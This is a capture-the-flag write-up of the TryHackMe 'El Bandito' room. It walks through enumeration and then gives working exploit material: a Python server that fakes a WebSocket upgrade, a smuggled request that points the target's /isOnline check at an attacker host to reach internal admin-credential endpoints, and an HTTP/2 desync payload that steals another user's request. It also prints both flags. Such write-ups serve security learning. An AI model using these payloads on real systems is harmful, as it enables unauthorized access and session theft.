<div align="center">

# El Bandito — TryHackMe Write-up

<img src="../assets/images/El-Bandito-room-overview.png" width="850">

<br>

![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red)
![Category](https://img.shields.io/badge/Category-Web%20Security-blue)
![Focus](https://img.shields.io/badge/Focus-HTTP%20Smuggling-orange)
![Protocol](https://img.shields.io/badge/Protocol-HTTP%2F2-green)

</div>

---

# El Bandito — TryHackMe Write-up

## Room Overview

El Bandito, the new identity of the infamous Jack the Exploiter, has entered the Web3 landscape with a large-scale token scam operation. By abusing the decentralized nature of blockchain technologies, he distributed fraudulent tokens to deceive investors and destabilize trust within the DeFi ecosystem.

The objective of this challenge is to investigate the infrastructure used by El Bandito, uncover hidden vulnerabilities, retrieve the required web flags, and ultimately track down his operations.

Difficulty: **Hard**

---

## Table of Contents

* [Room Overview](#room-overview)
* [Objectives](#objectives)
* [Reconnaissance](#reconnaissance)
* [Web Enumeration](#web-enumeration)
* [Directory Enumeration](#directory-enumeration)
* [Port 8080 Enumeration](#port-8080-enumeration)
* [JavaScript Analysis](#javascript-analysis)
* [Service Discovery & Backend Analysis](#service-discovery--backend-analysis)
* [Exploiting the WebSocket Upgrade Mechanism](#exploiting-the-websocket-upgrade-mechanism)
* [HTTP/2 Desynchronization Attack](#http2-desynchronization-attack)
* [Flags](#flags)
* [Lessons Learned](#lessons-learned)
* [Conclusion](#conclusion)

---

## Objectives

1. Find the first web flag
2. Find the second web flag

---

## Reconnaissance

The engagement began with active reconnaissance against the target machine to identify exposed services, application technologies, and potential attack surfaces.

An initial Nmap scan was performed using default scripts and version detection.

### Nmap Scan

```bash
nmap -sC -sV <MACHINE_IP>
```

### Output

```text
PORT     STATE SERVICE VERSION

22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13

631/tcp  open  ipp      CUPS 2.4
|_http-title: Forbidden - CUPS v2.4.12

80/tcp   open  ssl/http El Bandito Server
8080/tcp open  http     Nginx
```

### Analysis

The scan revealed multiple exposed web services along with an SSH service.

Interesting observations included:

* A CUPS service exposed externally on port `631`
* An HTTPS web application hosted on port `80`
* A separate Nginx-based application hosted on port `8080`

Since multiple HTTP services were exposed, the assessment primarily focused on web application enumeration.

---

## Web Enumeration

After the initial reconnaissance phase, the HTTPS service hosted on the target machine was manually inspected through a web browser.

Browsing to the HTTPS application revealed a minimal page displaying the message:

```text
nothing to see
```

At first glance, the application appeared intentionally minimal and did not expose any obvious functionality.

### Initial HTTPS Page

![Initial HTTPS Page](../assets/images/El-Bandito-https-recon.png)

Since minimal web applications often hide functionality within client-side resources, the page source was inspected for additional clues.

---

## Source Code Analysis

Reviewing the HTML source code revealed a JavaScript reference pointing to:

```text
static/messages.js
```

This suggested that additional functionality or hidden logic might exist within the application's static resources.

### Page Source Inspection

![Page Source](../assets/images/El-Bandito-https-source.png)

The discovery of the JavaScript file indicated that further web enumeration was required to uncover hidden endpoints and application functionality.

---

## Directory Enumeration

To identify hidden endpoints and exposed functionality, directory enumeration was performed against the HTTPS service using Gobuster.

### Gobuster Scan

```bash
gobuster dir -u https://<MACHINE_IP>:80/ \
-w <WORDLIST_PATH> \
-x txt,js,php,html -k
```

### Output

```text
/static               (Status: 301)
/login                (Status: 405)
/access               (Status: 200)
/ping                 (Status: 200)
/messages             (Status: 302)
/save                 (Status: 405)
/logout               (Status: 302)
/flush                (Status: 200)
```

### Analysis

The enumeration process revealed several interesting endpoints exposed by the application.

| Endpoint    | Observation                                    |
| ----------- | ---------------------------------------------- |
| `/access`   | Accessible sign-in page                        |
| `/login`    | Login-related functionality returning HTTP 405 |
| `/messages` | Redirected back to root                        |
| `/flush`    | Accessible endpoint returning HTTP 200         |
| `/ping`     | Active endpoint responding successfully        |

The `/access` endpoint exposed a sign-in interface, indicating that the application implemented an authentication mechanism that could potentially be targeted during further testing.

Multiple endpoints also returned successful responses (`HTTP 200 OK`), suggesting additional application functionality that required deeper investigation.

### Sign-In Page

![Sign-In Page](../assets/images/El-Bandito-https-login.png)

At this stage, the focus shifted toward analyzing the authentication workflow and interacting with the discovered endpoints to identify potential vulnerabilities or logic flaws.

---

## Further Enumeration

Despite identifying multiple endpoints and an exposed sign-in interface, further manual testing of the application hosted on port `80` did not immediately reveal any exploitable vulnerabilities or useful information.

The exposed functionality largely resulted in redirects, restricted methods, or dead ends during initial testing.

At this stage, the attack surface on port `80` appeared temporarily exhausted.

Attention then shifted toward another exposed service running on port `8080`.

---

## Port 8080 Enumeration

Browsing to port `8080` revealed a cryptocurrency-themed application called **Bandit-Coin**.

The application simulated a Web3 cryptocurrency platform and exposed a dashboard-style interface.

### Bandit-Coin Dashboard

![Bandit-Coin Dashboard](../assets/images/El-Bandito-8080-dashboard.png)

Initial walkthrough and manual testing did not immediately expose sensitive functionality.

Since the application appeared significantly larger than the previous service, additional enumeration was performed.

### Gobuster Enumeration

```bash
gobuster dir -u http://<MACHINE_IP>:8080 \
-w <WORDLIST_PATH> \
-b 404
```

### Interesting Endpoints

```text
/admin               (Status: 403)
/assets              (Status: 200)
/health              (Status: 200)
/traceroute          (Status: 403)
/trace               (Status: 403)
/environment         (Status: 403)
/administration      (Status: 403)
/error               (Status: 500)
/administrator       (Status: 403)
/metrics             (Status: 403)
/env                 (Status: 403)
/dump                (Status: 403)
```

### Analysis

The enumeration process exposed several potentially sensitive endpoints associated with:

* administrative functionality
* debugging interfaces
* environment configuration
* tracing utilities
* metrics collection

Several endpoints returning `403 Forbidden` were especially interesting because they confirmed the existence of restricted resources rather than nonexistent paths.

| Endpoint                 | Observation                                  |
| ------------------------ | -------------------------------------------- |
| `/admin`                 | Restricted administrative functionality      |
| `/environment`           | Potential environment configuration exposure |
| `/metrics`               | Monitoring or observability endpoint         |
| `/dump`                  | Potential debug or memory dump functionality |
| `/trace` & `/traceroute` | Possible tracing or diagnostic utilities     |
| `/error`                 | Returned HTTP 500 Internal Server Error      |

The `/error` endpoint returning `HTTP 500` strongly suggested backend processing issues and indicated that malformed requests could potentially expose additional behavior.

---

## JavaScript Analysis

While analyzing the exposed `static/messages.js` file discovered earlier during source code inspection, additional application functionality was identified within the client-side JavaScript logic.

Reviewing the script revealed two interesting endpoints:

```text
/getMessages
/send_message
```

The `fetchMessages()` function performed requests to `/getMessages` in order to retrieve user messages dynamically.

```javascript
fetch("/getMessages")
```

### `fetchMessages()` Function

![fetchMessages Function](../assets/images/El-Bandito-getmessages-function.png)

Attempting to access `/getMessages` directly through the browser resulted in a redirect back to the login page, indicating that authentication was required.

Further analysis revealed another function named `sendMessage()` which issued POST requests to `/send_message`.

```javascript
fetch("/send_message", {
	method: "POST"
})
```

Direct browser access to `/send_message` returned:

```text
Method Not Allowed
```

### `sendMessage()` Function

![sendMessage Function](../assets/images/El-Bandito-sendmessage-function.png)

This behavior suggested that the endpoint specifically expected crafted POST requests rather than standard browser GET requests.

The exposed messaging functionality became highly interesting because:

* authenticated message retrieval was implemented
* client-side messaging logic was exposed
* backend interaction endpoints were visible
* custom POST requests handled user-controlled data

---

## Service Discovery & Backend Analysis

While exploring the **Bandit-Coin** dashboard, the services section exposed two internal domains:

```text
http://bandito.websocket.thm  -> OFFLINE
http://bandito.public.thm     -> ONLINE
```

### Exposed Internal Services

![Services Dashboard](../assets/images/El-Bandito-services-dashboard.png)

Testing the discovered domains revealed different behavior:

* `bandito.public.thm` redirected back to the main application
* `bandito.websocket.thm` remained inaccessible externally

This strongly suggested the existence of an internal backend service.

Further investigation using browser developer tools revealed requests being sent to:

```text
/isOnline?url=
```

Example request:

```http
GET /isOnline?url=http://bandito.websocket.thm HTTP/1.1
Host: 10.49.178.30:8080
User-Agent: Mozilla/5.0
Referer: http://10.49.178.30:8080/services.html
Connection: keep-alive
```

Interestingly, the responses differed:

| URL                     | Response |
| ----------------------- | -------- |
| `bandito.public.thm`    | HTTP 200 |
| `bandito.websocket.thm` | HTTP 500 |

This strongly indicated that the backend application was attempting to communicate with internal services directly.

Several observations made this endpoint suspicious:

* user-controlled URLs were processed by the backend
* internal hostnames were exposed
* responses differed depending on target service
* backend connectivity checks appeared implemented

The `bandito.websocket.thm` hostname strongly suggested internal WebSocket-related functionality.

---

## Exploiting the WebSocket Upgrade Mechanism

To exploit the suspected backend proxy behavior, a custom Python HTTP server was created to return a `101 Switching Protocols` response, simulating a successful WebSocket upgrade.

### Malicious Upgrade Server

```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("Usage: {}".format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.protocol_version = "HTTP/1.1"
        self.send_response(101)
        self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

The server was started locally using:

```bash
python3 server.py <PORT_NO>
```

The supplied argument specifies the listening port for the malicious server.

A crafted request was then sent through Burp Repeater:

```http
GET /isOnline?url=http://<ATTACKER_IP>:<PORT_NO> HTTP/1.1
Host: 10.10.91.160:8080
Set-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==late, br

GET /env HTTP/1.1
Host: 10.10.91.160:8080
```

### Important Notes

* Burp Repeater's **Update Content-Length** option had to be disabled
* Two blank lines had to be left after the smuggled request
* The backend incorrectly trusted the upgraded connection

Successful exploitation allowed access to restricted internal endpoints.

### `/env` Response

![env Response](../assets/images/El-Bandito-env.png)

The same technique was then used against `/trace`.

### `/trace` Response

![trace Response](../assets/images/El-Bandito-trace.png)

The `/trace` response exposed additional sensitive internal paths:

```text
/admin-creds
/admin-flag
```

Using the same smuggling technique, requests were crafted to retrieve the contents of both endpoints.

### `/admin-creds` Response

![admin-creds Response](../assets/images/El-Bandito-admin-creds.png)

The retrieved credentials provided administrative access required to continue the challenge.

### `/admin-flag` Response

![admin-flag Response](../assets/images/El-Bandito-admin-flag.png)

This vulnerability demonstrated a critical flaw in backend request parsing and WebSocket upgrade handling.

---

## HTTP/2 Desynchronization Attack

Using the previously retrieved administrative credentials, access was gained to the chat application hosted on port `80`.

While analyzing authenticated traffic through Burp Suite, it was observed that the application communicated using the `HTTP/2` protocol.

HTTP request desynchronization vulnerabilities occur when frontend and backend servers interpret request boundaries differently, allowing attackers to manipulate backend request queues.

The assessment focused on poisoning the backend queue to retrieve requests belonging to other users.

### Smuggled HTTP/2 Request

```http
POST / HTTP/2
Host: 10.10.40.250:80
Cookie: session=<SESSION_ID>
Content-Length: 0
Content-Type: application/x-www-form-urlencoded

POST /send-message HTTP/1.1
Host: 10.10.40.250:80
Cookie: session=<SESSION_ID>
Content-Length: 900
Content-Type: application/x-www-form-urlencoded

data=e
```

The payload abused inconsistencies between HTTP/2 and backend HTTP/1.1 request parsing.

The backend incorrectly interpreted the smuggled request as a separate HTTP request, allowing the backend request queue to become poisoned.

### Important Notes

* Burp Repeater's **Update Content-Length** option had to be disabled
* Two blank lines had to be left after the smuggled request
* The payload had to be sent multiple times
* The chat application required repeated refreshing

Successful exploitation eventually caused another user's request to be processed within the poisoned backend connection.

This resulted in retrieval of the second flag.

### Second Flag Retrieved

![Second Flag](../assets/images/El-Bandito-final-flag.png)

This attack demonstrated a critical HTTP/2 desynchronization vulnerability caused by improper request boundary handling between frontend and backend systems.

---

## Flags

### Flag 1

```text
THM{:::MY_DECLINATION:+62°_14'_31.4'':::}
```

### Flag 2

```text
THM{¡!¡RIGHT_ASCENSION_12h_36m_25.46s!¡!}
```

---

## Lessons Learned

This room demonstrated several advanced web exploitation concepts and highlighted how modern backend architectures can introduce dangerous attack surfaces when frontend and backend parsing behavior becomes inconsistent.

Key takeaways included:

* Importance of detailed enumeration and source code analysis
* Discovering hidden functionality through JavaScript inspection
* Identifying internal services exposed indirectly through backend requests
* Understanding WebSocket upgrade behavior
* Exploiting HTTP request smuggling vulnerabilities
* Performing HTTP/2 desynchronization attacks
* Backend request queue poisoning techniques
* Leveraging proxy parsing inconsistencies for unauthorized access

This room was particularly valuable for understanding modern backend exploitation techniques involving reverse proxies, protocol upgrades, and request parsing discrepancies.

---

## Conclusion

El Bandito was an excellent advanced web exploitation challenge focused heavily on modern backend attack vectors.

The room combined:

* reconnaissance
* JavaScript analysis
* backend service discovery
* HTTP smuggling
* WebSocket upgrade abuse
* HTTP/2 desynchronization

into a realistic attack chain demonstrating how subtle parsing inconsistencies can lead to severe security vulnerabilities.

This room significantly improved understanding of advanced web application exploitation techniques and backend request handling behavior.
